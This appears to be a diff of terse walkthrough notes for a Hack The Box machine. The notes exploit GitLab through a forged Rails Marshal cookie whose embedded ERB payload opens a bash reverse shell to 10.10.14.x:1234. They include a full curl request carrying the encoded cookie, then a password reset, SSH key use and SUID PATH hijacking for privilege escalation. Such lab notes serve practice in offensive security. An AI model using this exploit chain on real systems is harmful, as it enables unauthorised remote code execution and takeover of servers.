@@ -14,13 +14,18 @@ request = ActionDispatch::Request.new(Rails.application.env_config)
 request.env["action_dispatch.cookies_serializer"] = :marshal
 cookies = request.cookie_jar
 
-erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'` %>")
+erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.7/1234 0>&1'` %>")
 depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
 cookies.signed[:cookie] = depr
 puts cookies[:cookie]
 
-curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIvMTIzNCAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--32d75224ca00abf503a49155bd7889d321117087"
+
+curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id= <GENERATED COOKIE> "
 
 
 https://docs.gitlab.com/12.10/ee/security/reset_root_password.html <- USE THIS TO RESET PASSWORD OF username: 'dexter'
 ssh key found inside
+
+find suid files, notice docker-security
+
+strings docker-security -> relative paths for chmod -> export PATH=/tmp:$PATH etc etc.
